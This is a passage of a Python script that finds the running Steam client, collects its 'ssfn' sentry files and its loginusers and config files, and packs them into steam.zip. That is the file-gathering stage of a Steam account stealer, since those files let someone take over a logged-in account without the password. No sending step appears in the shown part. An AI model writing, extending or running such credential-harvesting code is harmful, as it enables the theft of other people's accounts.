            if file.startswith('ssfn') or 'config\\loginusers' in root + '\\' + file or 'config\\config' in root + '\\' + file:
                target_files.append(os.path.join(root, file))
    return target_files

def compress_files(files, output_filename='steam.zip'):
    """Compresses the collected files into a zip archive."""
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

def main():
    steam_path = steam_process_locator()
    if steam_path:
        files = collect_files(steam_path)
        compress_files(files)
        print(f"Files from {steam_path} have been compressed into steam.zip.")
    else:
        print("Steam process not found. Make sure Steam is running.")

if __name__ == '__main__':
    main()
